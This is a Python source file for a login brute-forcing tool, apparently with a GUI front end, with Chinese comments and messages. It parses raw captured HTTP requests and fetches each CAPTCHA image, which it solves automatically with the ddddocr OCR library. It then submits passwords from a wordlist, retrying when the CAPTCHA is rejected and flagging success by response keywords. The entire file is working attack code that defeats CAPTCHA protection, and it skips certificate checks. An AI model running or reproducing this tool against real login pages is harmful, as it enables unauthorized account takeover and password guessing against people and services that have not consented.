import json
import time
import logging
import requests
import ddddocr
import urllib.parse

# 禁用ddddocr的调试信息输出
logging.getLogger("ddddocr").setLevel(logging.ERROR)

logger = logging.getLogger("LoginCracker")

class Cracker:
    def __init__(self, login_data, captcha_data, target_param, captcha_param, dictionary_path, success_keywords,
                 protocol='http',
                 delay=1,
                 captcha_error_keywords="",  # 添加验证码错误关键词参数
                 update_callback=None, progress_callback=None, finished_callback=None, captcha_callback=None):
        self.login_data = login_data
        self.captcha_data = captcha_data
        self.target_param = target_param
        self.captcha_param = captcha_param
        self.dictionary_path = dictionary_path
        self.success_keywords = success_keywords.split(',') if success_keywords else ["success", "登录成功"]
        self.captcha_error_keywords = captcha_error_keywords.split(',') if captcha_error_keywords else ["验证码不正确", "验证码错误", "验证码已失效"]
        self.is_running = True
        self.protocol = protocol
        self.delay = delay
        
        # 回调函数
        self.update_callback = update_callback
        self.progress_callback = progress_callback
        self.finished_callback = finished_callback
        self.captcha_callback = captcha_callback
        
    def start(self):
        try:
            # 解析登录数据包
            login_url, login_headers, login_data, method = self.parse_request(self.login_data)
            
            # 解析验证码数据包
            captcha_url, captcha_headers, _, _ = self.parse_request(self.captcha_data)
            
            # 初始化OCR
            ocr = ddddocr.DdddOcr(show_ad=False)
            
            # 读取字典
            with open(self.dictionary_path, 'r', encoding='utf-8') as f:
                passwords = f.read().splitlines()
            
            total = len(passwords)
            
            for i, password in enumerate(passwords):
                if not self.is_running:
                    break
                    
                # 更新进度
                if self.progress_callback:
                    self.progress_callback(int((i / total) * 100))
                    
                # 应用延迟
                if i > 0 and self.delay > 0:
                    time.sleep(self.delay)
                    
                # 获取验证码图片
                try:
                    # 最大重试次数
                    max_retries = 3
                    retry_count = 0
                    
                    while retry_count <= max_retries and self.is_running:
                        captcha_response = requests.get(captcha_url, headers=captcha_headers, verify=False)
                        captcha_image = captcha_response.content
                        
                        # 记录验证码请求和响应
                        logger.info(f"验证码请求 URL: {captcha_url}")
                        logger.info(f"验证码响应状态码: {captcha_response.status_code}")
                        
                        # 识别验证码
                        captcha_text = ocr.classification(captcha_image)
                        
                        # 发送验证码图片和识别结果到UI
                        if self.captcha_callback:
                            self.captcha_callback(captcha_image, captcha_text)
                        
                        # 更新登录数据
                        login_data_copy = login_data.copy()
                        login_data_copy[self.target_param] = password
                        login_data_copy[self.captcha_param] = captcha_text
                        
                        # 记录登录请求
                        if retry_count == 0:
                            logger.info(f"\n{'='*50}\n尝试密码: {password}\n{'='*50}")
                        else:
                            logger.info(f"\n{'='*50}\n重试密码: {password} (第{retry_count}次重试)\n{'='*50}")
                            
                        logger.info(f"登录请求 URL: {login_url}")
                        logger.info(f"登录请求方法: {method}")
                        logger.info(f"登录请求数据: {login_data_copy}")
                        
                        # 发送登录请求
                        if method.upper() == 'POST':
                            login_response = requests.post(login_url, headers=login_headers, data=login_data_copy, verify=False)
                        else:
                            login_response = requests.get(login_url, headers=login_headers, params=login_data_copy, verify=False)
                        
                        # 记录登录响应
                        logger.info(f"登录响应状态码: {login_response.status_code}")
                        logger.info(f"登录响应内容: {login_response.text[:500]}...")  # 只记录前500个字符
                        
                        # 输出结果
                        retry_text = f" (重试 {retry_count})" if retry_count > 0 else ""
                        log_message = f"尝试: {password}{retry_text} | 验证码: {captcha_text} | 状态码: {login_response.status_code} | 登录响应内容: {login_response.text[:500]}\n"
                        
                        # 检查是否登录成功
                        success = False
                        for keyword in self.success_keywords:
                            if keyword.strip() and keyword.strip().lower() in login_response.text.lower():
                                success = True
                                break
                        
                        # 检查是否验证码错误
                        captcha_error = False
                        for keyword in self.captcha_error_keywords:
                            if keyword.strip() and keyword.strip().lower() in login_response.text.lower():
                                captcha_error = True
                                break
                        
                        if success:
                            log_message += " | 成功!"
                            logger.info(f"爆破成功! 密码: {password}")
                            if self.update_callback:
                                self.update_callback(log_message)
                            if self.finished_callback:
                                self.finished_callback(f"爆破成功! 密码: {password}")
                            return
                        elif captcha_error and retry_count < max_retries:
                            # 验证码错误，需要重试
                            log_message += f" | 验证码错误，准备重试..."
                            retry_count += 1
                            if self.update_callback:
                                self.update_callback(log_message)
                            # 短暂延迟后重试
                            time.sleep(1)
                            continue
                        else:
                            # 密码错误或已达到最大重试次数
                            if captcha_error:
                                log_message += " | 验证码错误，已达最大重试次数"
                            if self.update_callback:
                                self.update_callback(log_message)
                            break
                    
                except Exception as e:
                    error_msg = f"错误: {str(e)}"
                    logger.error(error_msg)
                    if self.update_callback:
                        self.update_callback(error_msg)
            
            if self.finished_callback:
                self.finished_callback("爆破完成，未找到正确密码")
            
        except Exception as e:
            error_msg = f"发生错误: {str(e)}"
            logger.error(error_msg)
            if self.finished_callback:
                self.finished_callback(error_msg)
                
    def stop(self):
        self.is_running = False
        
    def parse_request(self, raw_request):
        lines = raw_request.strip().split('\n')
        
        # 解析请求行
        request_line = lines[0].split(' ')
        method = request_line[0]  # 获取HTTP方法（GET/POST等）
        url = request_line[1]
        if not url.startswith('http'):
            # 从Host头中获取域名
            host = None
            port = None
            for line in lines[1:]:
                if line.startswith('Host:'):
                    host_line = line.split(':', 1)[1].strip()
                    if ':' in host_line:
                        host, port = host_line.split(':')
                    else:
                        host = host_line
                    break
            
            if host:
                if port:
                    url = f'{self.protocol}://{host}:{port}{url}'
                else:
                    url = f'{self.protocol}://{host}{url}'
            else:
                url = f'{self.protocol}://{url}'
        
        # 解析请求头
        headers = {}
        i = 1
        while i < len(lines) and lines[i]:
            if ': ' in lines[i]:
                key, value = lines[i].split(': ', 1)
                headers[key] = value
            i += 1
        
        # 解析请求体
        data = {}
        if i < len(lines) and i + 1 < len(lines):
            body = '\n'.join(lines[i+1:])
            if body:
                try:
                    # 尝试解析JSON
                    data = json.loads(body)
                except:
                    # 尝试解析表单数据
                    for param in body.split('&'):
                        if '=' in param:
                            key, value = param.split('=', 1)
                            data[key] = urllib.parse.unquote(value)
        
        return url, headers, data, method